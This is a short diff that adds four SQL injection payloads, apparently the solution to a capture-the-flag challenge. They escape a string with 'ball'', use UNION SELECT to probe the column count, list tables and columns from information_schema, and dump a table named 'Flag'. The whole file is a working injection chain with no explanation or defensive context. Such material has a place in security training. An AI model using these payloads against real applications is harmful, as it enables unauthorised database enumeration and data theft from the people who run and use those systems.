@@ -1,0 +1,7 @@
+ball' UNION SELECT NULL,NULL,NULL,1# 
+
+ball' UNION SELECT NULL,table_name,NULL,1 from information_schema.tables#
+
+ball' UNION SELECT NULL,NULL,COLUMN_NAME,1 from information_schema.columns WHERE TABLE_NAME = 'Flag'#
+
+ball' UNION SELECT 3,NULL,string,1 FROM Flag#
